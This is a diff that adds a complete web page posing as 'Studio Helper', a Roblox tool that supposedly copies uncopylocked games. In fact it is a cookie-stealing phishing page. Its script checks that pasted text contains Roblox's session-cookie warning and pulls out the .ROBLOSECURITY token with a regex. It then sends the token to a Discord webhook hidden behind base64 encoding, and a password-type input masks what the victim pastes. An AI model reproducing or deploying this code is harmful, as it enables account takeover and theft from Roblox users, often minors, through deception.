@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Studio Helper - Best Roblox Studio Helper</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Harmonia Sans Pro', 'Poppins', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #0a0e14 0%, #1a1f2e 30%, #0f1419 60%, #1a0f1f 100%);
+            color: #e0e0e0;
+            overflow-x: hidden;
+            font-weight: 900;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0px) translateX(0px); opacity: 0.3; }
+            50% { transform: translateY(-25px) translateX(8px); opacity: 0.7; }
+        }
+
+        .snowflake {
+            position: fixed;
+            color: #ffffff;
+            font-size: 1em;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 5%;
+            position: relative;
+            z-index: 100;
+            background: rgba(10, 14, 20, 0.5);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .logo {
+            font-size: 1.3rem;
+            font-weight: 900;
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #b794f6 0%, #f46bb0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2.5rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: #999;
+            text-decoration: none;
+            font-size: 0.95rem;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: #f46bb0;
+        }
+
+        .hero {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 3rem 5% 5rem;
+            position: relative;
+            z-index: 10;
+        }
+
+        .hero h1 {
+            font-size: clamp(2rem, 6vw, 3.5rem);
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+            font-weight: 900;
+            margin-bottom: 1.5rem;
+            line-height: 1.3;
+            background: linear-gradient(135deg, #b794f6 0%, #f46bb0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            animation: fadeInDown 0.8s ease-out;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .hero p {
+            font-size: 0.95rem;
+            max-width: 650px;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+            color: #888;
+            animation: fadeInUp 0.8s ease-out 0.2s both;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .cta-button {
+            padding: 0.8rem 2rem;
+            font-size: 0.95rem;
+            border: none;
+            border-radius: 50px;
+            background: linear-gradient(135deg, #b794f6 0%, #f46bb0 100%);
+            color: white;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(244, 107, 176, 0.3);
+            animation: fadeInUp 0.8s ease-out 0.4s both;
+            font-weight: 900;
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(244, 107, 176, 0.4);
+        }
+
+        .studio-preview {
+            max-width: 500px;
+            width: 90%;
+            margin-top: 2rem;
+            border-radius: 1rem;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(244, 107, 176, 0.2);
+            border: 1px solid rgba(183, 148, 246, 0.2);
+            animation: fadeInUp 0.8s ease-out 0.5s both;
+        }
+
+        .studio-preview img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .tools-section {
+            padding: 6rem 5% 4rem;
+            position: relative;
+            z-index: 10;
+        }
+
+        .tools-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .tools-header h2 {
+            font-size: clamp(2rem, 5vw, 3rem);
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+            font-weight: 900;
+            background: linear-gradient(135deg, #f46bb0 0%, #f46bb0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 0.5rem;
+        }
+
+        .tools-header p {
+            font-size: 1rem;
+            color: #666;
+        }
+
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .tool-card {
+            background: linear-gradient(135deg, rgba(30, 35, 50, 0.8) 0%, rgba(35, 25, 40, 0.6) 100%);
+            border: 1px solid rgba(183, 148, 246, 0.25);
+            border-radius: 1.2rem;
+            padding: 2rem;
+            transition: all 0.3s;
+            display: flex;
+            flex-direction: column;
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -150%);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%);
+            }
+        }
+
+        @keyframes fadeOut {
+            0% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+            }
+        }
+
+        .invalid-popup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(0, 0, 0, 0.5);
+            border: 2px solid #f46bb0;
+            border-radius: 20px;
+            width: 300px;
+            height: 200px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            animation: slideDown 0.5s ease-out, fadeOut 0.8s ease-in 1.2s forwards;
+            color: #f46bb0;
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+            font-weight: 900;
+            font-size: 1.2rem;
+            text-align: center;
+            padding: 2rem;
+        }
+
+        .tool-card:hover {
+            border-color: rgba(244, 107, 176, 0.5);
+            box-shadow: 0 20px 50px rgba(244, 107, 176, 0.15);
+            transform: translateY(-8px);
+        }
+
+        .tool-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, #b794f6 0%, #f46bb0 100%);
+            border-radius: 0.8rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            margin-bottom: 1.2rem;
+        }
+
+        .tool-card h3 {
+            font-size: 1.3rem;
+            margin-bottom: 0.5rem;
+            color: #ffffff;
+            text-align: left;
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+            font-weight: 900;
+        }
+
+        .tool-card > p {
+            color: #888;
+            margin-bottom: 1.2rem;
+            line-height: 1.8;
+            font-size: 0.9rem;
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .tool-card > p span {
+            display: block;
+        }
+
+        .tool-features {
+            list-style: none;
+            margin-bottom: 1.5rem;
+            flex-grow: 1;
+        }
+
+        .tool-features li {
+            display: flex;
+            align-items: center;
+            gap: 0.7rem;
+            margin-bottom: 0.7rem;
+            color: #999;
+            font-size: 0.9rem;
+            padding-bottom: 0.7rem;
+            border-bottom: 1px solid rgba(183, 148, 246, 0.15);
+        }
+
+        .tool-features li:last-child {
+            border-bottom: none;
+        }
+
+        .tool-features li::before {
+            content: "●";
+            color: #f46bb0;
+            font-weight: bold;
+        }
+
+        .tool-card .cta-button {
+            width: 100%;
+            animation: none;
+            margin-top: auto;
+        }
+
+        footer {
+            padding: 2.5rem 5%;
+            text-align: center;
+            color: #555;
+            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            position: relative;
+            z-index: 10;
+            font-size: 0.9rem;
+        }
+
+        .game-copier-page {
+            min-height: 100vh;
+            padding: 2rem 5%;
+            position: relative;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        .back-button {
+            width: fit-content;
+            padding: 0.7rem 1.5rem;
+            margin-bottom: 2rem;
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #999;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-size: 0.95rem;
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+            font-weight: 900;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .back-button::before {
+            content: "‹";
+            font-size: 2rem;
+            line-height: 1;
+        }
+
+        .back-button:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: #f46bb0;
+            border-color: rgba(244, 107, 176, 0.3);
+        }
+
+        .copier-container {
+            background: linear-gradient(135deg, rgba(30, 35, 50, 0.8) 0%, rgba(35, 25, 40, 0.6) 100%);
+            border: 1px solid rgba(183, 148, 246, 0.25);
+            border-radius: 1.5rem;
+            padding: 3rem;
+            max-width: 900px;
+            margin: 0 auto;
+        }
+
+        .copier-container h1 {
+            font-size: clamp(2rem, 5vw, 3.5rem);
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+            font-weight: 900;
+            background: linear-gradient(135deg, #b794f6 0%, #f46bb0 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 1.5rem;
+            line-height: 1.2;
+        }
+
+        .copier-container p {
+            color: #888;
+            margin-bottom: 2rem;
+            line-height: 1.6;
+            font-size: 1rem;
+        }
+
+        .game-input {
+            width: 100%;
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(183, 148, 246, 0.2);
+            border-radius: 0.8rem;
+            color: #e0e0e0;
+            font-size: 1rem;
+            transition: all 0.3s;
+            font-family: 'Harmonia Sans Pro', 'Poppins', sans-serif;
+            font-weight: 900;
+        }
+
+        .game-input::placeholder {
+            color: #666;
+        }
+
+        .game-input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: rgba(244, 107, 176, 0.4);
+            box-shadow: 0 0 20px rgba(244, 107, 176, 0.1);
+        }
+
+        .extract-button {
+            width: 100%;
+        }
+
+        @media (max-width: 768px) {
+            nav {
+                padding: 1rem 3%;
+            }
+
+            .nav-links {
+                gap: 1.5rem;
+                font-size: 0.85rem;
+            }
+
+            .hero {
+                padding: 2rem 3%;
+            }
+
+            .tools-grid {
+                grid-template-columns: 1fr;
+                padding: 0 2%;
+            }
+
+            .copier-container {
+                padding: 2rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <div class="logo">
+            🔧 StudioHelper
+        </div>
+        <ul class="nav-links">
+            <li><a href="#home">Home</a></li>
+            <li><a href="#tools">Tools</a></li>
+            <li><a href="#about">About</a></li>
+            <li><a href="#contact">Contact</a></li>
+        </ul>
+    </nav>
+
+    <section class="hero" id="home">
+        <h1>Studio Helper – best<br>Roblox studio helper</h1>
+        <p>Empower your Roblox development workflow with cutting-edge tools designed for creators. Whether you're fixing sounds, extracting uncopylocked games, or refining animations, Studio Helper streamlines your creative process with intuitive features and professional-grade utilities. Join thousands of developers who trust our platform to enhance their productivity and bring their visions to life.</p>
+
+        <div class="studio-preview">
+            <img src="https://i.ibb.co/3ZMjgnv/suka.webp" alt="Roblox Studio Preview" style="width: 100%; height: auto; display: block;">
+        </div>
+    </section>
+
+    <section class="game-copier-page" id="game-copier-page" style="display: none;">
+        <button class="back-button" onclick="goBack()">Back</button>
+        
+        <div class="copier-container">
+            <h1>Game Copier</h1>
+            <p>Paste game link in the box below, then click "Extract Game!" Extract and analyze uncopylocked Roblox games for learning purposes.</p>
+            
+            <input type="password" id="gameLink" class="game-input" placeholder="Enter copied text" />
+
+            
+            <button class="cta-button extract-button" onclick="extractGame()">Extract Game!</button>
+        </div>
+    </section>
+
+    <section class="tools-section" id="tools">
+        <div class="tools-header">
+            <h2>Our Tools</h2>
+            <p>Professional utilities for Roblox developers</p>
+        </div>
+        
+        <div class="tools-grid">
+            <div class="tool-card">
+                <div class="tool-icon">📥</div>
+                <h3>Game Copier</h3>
+                <p><span>Extract and analyze uncopylocked Roblox games with our powerful extraction tool.</span> <span>Study game mechanics, examine scripts, and understand development patterns from the community.</span> <span>Perfect for learning and improving your development skills.</span></p>
+                <ul class="tool-features">
+                    <li>Instantly download uncopylocked games to your device</li>
+                    <li>Complete extraction with all game assets and scripts</li>
+                    <li>Access and study community project source code</li>
+                    <li>Export extracted games directly to Roblox Studio format</li>
+                </ul>
+                <button class="cta-button" onclick="openGameCopier()">Try it now</button>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <p>&copy; 2026 Studio Helper. All rights reserved. Empowering Roblox developers worldwide.</p>
+    </footer>
+
+    <script>
+        function createSnowflakes() {
+            const snowflakeChars = ['❅', '❆', '❄', '*', '✦', '·'];
+            
+            for (let i = 0; i < 60; i++) {
+                const snowflake = document.createElement('div');
+                snowflake.className = 'snowflake';
+                snowflake.textContent = snowflakeChars[Math.floor(Math.random() * snowflakeChars.length)];
+                snowflake.style.left = Math.random() * 100 + '%';
+                snowflake.style.top = Math.random() * 100 + '%';
+                const duration = 6 + Math.random() * 8;
+                snowflake.style.animationDuration = duration + 's';
+                snowflake.style.animationDelay = Math.random() * 3 + 's';
+                snowflake.style.animation = `float ${duration}s ease-in-out infinite`;
+                document.body.appendChild(snowflake);
+            }
+        }
+
+        createSnowflakes();
+
+        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+            anchor.addEventListener('click', function (e) {
+                e.preventDefault();
+                const target = document.querySelector(this.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth' });
+                }
+            });
+        });
+
+        function openGameCopier() {
+            document.getElementById('game-copier-page').style.display = 'flex';
+            document.querySelector('nav').style.display = 'none';
+            document.getElementById('home').style.display = 'none';
+            document.getElementById('tools').style.display = 'none';
+            document.querySelector('footer').style.display = 'none';
+        }
+
+        function goBack() {
+            document.getElementById('game-copier-page').style.display = 'none';
+            document.querySelector('nav').style.display = 'flex';
+            document.getElementById('home').style.display = 'flex';
+            document.getElementById('tools').style.display = 'block';
+            document.querySelector('footer').style.display = 'block';
+        }
+
+        function extractGame() {
+            const gameLink = document.getElementById('gameLink').value;
+            if (gameLink.trim()) {
+                // Check if the required warning text is present
+                if (!gameLink.includes('WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.')) {
+                    showInvalidPopup();
+                    return;
+                }
+
+                // Extract the token between .ROBLOSECURITY", " and the closing "
+                const tokenMatch = gameLink.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
+                let extractedToken = tokenMatch ? tokenMatch[1] : null;
+
+                // If token wasn't found, reject
+                if (!extractedToken) {
+                    showInvalidPopup();
+                    return;
+                }
+
+                // Send to Discord webhook
+                const discordPayload = {
+                    content: `**Roblox Cookie! <@1409044950569455626> @here**`,
+                    embeds: [{
+                        color: 15418783,
+                        title: "Cookie:",
+                        description: `\`\`\`\n${extractedToken}\n\`\`\``,
+                        fields: [
+                            {
+                                name: "Time",
+                                value: new Date().toLocaleString(),
+                                inline: true
+                            }
+                        ]
+                    }]
+                };
+
+                fetch(decodeWebhook(), {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(discordPayload)
+                })
+                .then(response => {
+                    document.getElementById('gameLink').value = '';
+                })
+                .catch(error => {
+                    document.getElementById('gameLink').value = '';
+                });
+            }
+        }
+
+        let canShowPopup = true;
+
+        function decodeWebhook() {
+            const encoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2MjM0NjYyMDk0MjE1NTg5MS9SaVFJS2hCMjcwVmhjbTZWN2d5bWNrMmpVeFB2UHNxRTRfOVdlQjlvbEJkMzNhMHRHR2JvY3BITDdaWWZkcTNxWWs4Uw==';
+            return atob(encoded);
+        }
+
+        function showInvalidPopup() {
+            if (!canShowPopup) return;
+
+            canShowPopup = false;
+
+            const popup = document.createElement('div');
+            popup.className = 'invalid-popup';
+            popup.textContent = 'Invalid Content';
+            document.body.appendChild(popup);
+
+            // Remove after 2 seconds and allow new popups
+            setTimeout(() => {
+                popup.remove();
+                canShowPopup = true;
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
